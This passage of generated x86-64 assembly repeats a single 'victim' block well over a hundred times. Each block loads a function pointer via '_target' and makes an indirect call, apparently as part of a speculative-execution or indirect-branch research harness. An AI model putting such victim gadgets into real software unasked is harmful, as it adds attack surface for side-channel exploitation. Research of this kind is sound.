	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 56
.Lvictim_win0_var56:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 57
.Lvictim_win0_var57:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 58
.Lvictim_win0_var58:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 59
.Lvictim_win0_var59:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 60
.Lvictim_win0_var60:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 61
.Lvictim_win0_var61:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 62
.Lvictim_win0_var62:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 63
.Lvictim_win0_var63:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 64
.Lvictim_win0_var64:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 65
.Lvictim_win0_var65:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 66
.Lvictim_win0_var66:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 67
.Lvictim_win0_var67:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 68
.Lvictim_win0_var68:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 69
.Lvictim_win0_var69:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 70
.Lvictim_win0_var70:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 71
.Lvictim_win0_var71:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 72
.Lvictim_win0_var72:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 73
.Lvictim_win0_var73:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 74
.Lvictim_win0_var74:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 75
.Lvictim_win0_var75:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 76
.Lvictim_win0_var76:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 77
.Lvictim_win0_var77:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 78
.Lvictim_win0_var78:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 79
.Lvictim_win0_var79:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 80
.Lvictim_win0_var80:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 81
.Lvictim_win0_var81:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 82
.Lvictim_win0_var82:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 83
.Lvictim_win0_var83:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 84
.Lvictim_win0_var84:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 85
.Lvictim_win0_var85:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 86
.Lvictim_win0_var86:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 87
.Lvictim_win0_var87:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 88
.Lvictim_win0_var88:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 89
.Lvictim_win0_var89:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 90
.Lvictim_win0_var90:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 91
.Lvictim_win0_var91:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 92
.Lvictim_win0_var92:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 93
.Lvictim_win0_var93:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 94
.Lvictim_win0_var94:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 95
.Lvictim_win0_var95:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 96
.Lvictim_win0_var96:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 97
.Lvictim_win0_var97:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 98
.Lvictim_win0_var98:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 99
.Lvictim_win0_var99:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 100
.Lvictim_win0_var100:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 101
.Lvictim_win0_var101:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 102
.Lvictim_win0_var102:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 103
.Lvictim_win0_var103:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 104
.Lvictim_win0_var104:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 105
.Lvictim_win0_var105:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 106
.Lvictim_win0_var106:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 107
.Lvictim_win0_var107:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 108
.Lvictim_win0_var108:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 109
.Lvictim_win0_var109:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 110
.Lvictim_win0_var110:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 111
.Lvictim_win0_var111:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 112
.Lvictim_win0_var112:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 113
.Lvictim_win0_var113:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 114
.Lvictim_win0_var114:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 115
.Lvictim_win0_var115:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 116
.Lvictim_win0_var116:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 117
.Lvictim_win0_var117:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 118
.Lvictim_win0_var118:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 119
.Lvictim_win0_var119:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 120
.Lvictim_win0_var120:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 121
.Lvictim_win0_var121:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 122
.Lvictim_win0_var122:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 123
.Lvictim_win0_var123:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 124
.Lvictim_win0_var124:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 125
.Lvictim_win0_var125:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 126
.Lvictim_win0_var126:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 127
.Lvictim_win0_var127:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 128
.Lvictim_win0_var128:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 129
.Lvictim_win0_var129:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 130
.Lvictim_win0_var130:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 131
.Lvictim_win0_var131:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 132
.Lvictim_win0_var132:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 133
.Lvictim_win0_var133:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 134
.Lvictim_win0_var134:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 135
.Lvictim_win0_var135:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 136
.Lvictim_win0_var136:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 137
.Lvictim_win0_var137:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 138
.Lvictim_win0_var138:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 139
.Lvictim_win0_var139:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 140
.Lvictim_win0_var140:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 141
.Lvictim_win0_var141:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 142
.Lvictim_win0_var142:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 143
.Lvictim_win0_var143:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 144
.Lvictim_win0_var144:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 145
.Lvictim_win0_var145:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 146
.Lvictim_win0_var146:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 147
.Lvictim_win0_var147:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 148
.Lvictim_win0_var148:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 149
.Lvictim_win0_var149:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 150
.Lvictim_win0_var150:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 151
.Lvictim_win0_var151:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 152
.Lvictim_win0_var152:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 153
.Lvictim_win0_var153:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 154
.Lvictim_win0_var154:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 155
.Lvictim_win0_var155:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 156
.Lvictim_win0_var156:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 157
.Lvictim_win0_var157:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 158
.Lvictim_win0_var158:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 159
.Lvictim_win0_var159:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 160
.Lvictim_win0_var160:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 161
.Lvictim_win0_var161:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 162
.Lvictim_win0_var162:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 163
.Lvictim_win0_var163:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 164
.Lvictim_win0_var164:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 165
.Lvictim_win0_var165:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 166
.Lvictim_win0_var166:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 167
.Lvictim_win0_var167:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 168
.Lvictim_win0_var168:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 169
.Lvictim_win0_var169:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 170
.Lvictim_win0_var170:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 171
.Lvictim_win0_var171:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 172
.Lvictim_win0_var172:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 173
.Lvictim_win0_var173:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 174
.Lvictim_win0_var174:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 175
.Lvictim_win0_var175:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 176
.Lvictim_win0_var176:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 177
.Lvictim_win0_var177:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 178
.Lvictim_win0_var178:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 179
.Lvictim_win0_var179:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 180
.Lvictim_win0_var180:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 181
.Lvictim_win0_var181:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 182
.Lvictim_win0_var182:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
